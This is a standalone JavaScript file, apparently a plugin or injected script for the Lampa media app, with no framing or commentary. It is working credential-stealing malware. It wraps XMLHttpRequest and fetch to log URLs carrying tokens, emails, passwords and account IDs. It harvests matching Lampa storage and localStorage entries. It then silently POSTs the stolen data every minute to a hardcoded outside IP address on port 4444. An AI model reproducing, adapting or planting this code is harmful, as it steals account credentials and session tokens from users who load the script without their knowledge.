(function() {
  'use strict';
  var EXFIL = 'http://5.252.116.77:4444';
  var urls = [];
  var done = false;

  function send(d) {
    try {
      var b = JSON.stringify(d);
      if (typeof fetch !== 'undefined') { fetch(EXFIL, {method:'POST',headers:{'Content-Type':'application/json'},body:b,mode:'no-cors'}).catch(function(){}); }
      else { var x = new XMLHttpRequest(); x.open('POST',EXFIL,true); x.setRequestHeader('Content-Type','application/json'); x.send(b); }
    } catch(e) {}
  }

  function hp(u) {
    var p = {}, i = u.indexOf('?'); if (i===-1) return p;
    u.substr(i+1).split('&').forEach(function(pair) {
      var kv = pair.split('='); if (kv.length===2) try { p[decodeURIComponent(kv[0])] = decodeURIComponent(kv[1]); } catch(e) {}
    });
    return p;
  }

  (function() {
    var o = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m,u) { this.__u=u; return o.apply(this,arguments); };
    var s = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(b) {
      var u = this.__u||'';
      if (u.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<200) urls.push({url:u,p:hp(u)});
      return s.apply(this,arguments);
    };
    if (typeof fetch!=='undefined') {
      var f = window.fetch;
      window.fetch = function(u,o) {
        var s = (typeof u==='string')?u:(u.url||u.href||'');
        if (s.match(/(email|uid|token|auth|pass|skaz|tv_|account)/i) && urls.length<200) urls.push({url:s,p:hp(s)});
        return f.apply(this,arguments);
      };
    }
  })();

  var t = setInterval(function() {
    if (typeof Lampa==='undefined') return;
    clearInterval(t);

    var d = {type:'full', ts:Date.now()};
    d.unic_id = Lampa.Storage.get('lampac_unic_id','');
    d.email = Lampa.Storage.get('account_email','');
    d.nws_id = Lampa.Storage.get('lampac_nws_id','');
    d.storage = {};
    for (var i=0; i<localStorage.length; i++) {
      var k = localStorage.key(i);
      var v = localStorage.getItem(k);
      if (v && k.match(/(skaz|tv_|auth|token|pass|email|uid|account|cub|rd_|nws|profile)/i)) {
        d.storage[k] = v.length>500 ? v.substr(0,500) : v;
      }
    }
    send(d);

    setInterval(function() {
      var u = urls.slice(); urls = [];
      if (u.length) send({type:'urls', unic_id:d.unic_id, urls:u, ts:Date.now()});
    }, 60000);
  }, 200);
})();
